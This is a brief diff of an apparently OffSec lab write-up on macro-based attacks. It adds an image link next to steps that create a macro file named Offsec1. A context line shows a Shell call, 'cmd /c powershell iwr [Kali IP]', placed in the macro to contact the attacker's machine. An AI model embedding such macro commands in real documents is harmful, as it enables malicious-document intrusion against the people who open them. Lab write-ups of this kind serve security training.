@@ -105,7 +105,7 @@ Enumerated top 200 UDP ports:
 
 #### - Clicked "Untitled 1" > "New" and named the file Offsec1 and clicked "OK":
 
-
+![](Pasted%20image%2020230407224715.png)
 
 #### - Typed Tab > Shell ("cmd /c powershell iwr [Kali IP]") between "Sub Main" and "End Sub" (which will perform an HTTP request to our IP). If we are hosting on port 80 and port is open the command should execute:
 
